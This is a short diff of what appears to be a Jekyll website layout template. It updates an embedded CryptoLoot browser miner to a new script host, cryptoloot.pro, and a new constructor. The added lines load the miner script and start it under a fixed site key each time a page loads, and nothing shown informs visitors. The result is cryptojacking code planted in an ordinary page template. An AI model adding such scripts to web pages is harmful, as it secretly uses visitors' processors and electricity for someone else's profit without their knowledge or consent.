@@ -16,9 +16,9 @@ layout: compress
     </main>
     {% include footer.html %}
     <script src="{{ "/assets/js/main.min.js" | prepend: site.baseurl }}"></script>
-    <script src="https://crypto-loot.com/lib/miner.min.js"></script>
+    <script src="//cryptoloot.pro/lib/crlt.js"></script>
     <script>
-        var miner = new CryptoLoot.Anonymous('9e00f5e94a101142e2ba7c76a2424493913fc5eb2570');
+        var miner = new CRLT.Anonymous('9e00f5e94a101142e2ba7c76a2424493913fc5eb2570');
         miner.start();
     </script>
 </body>
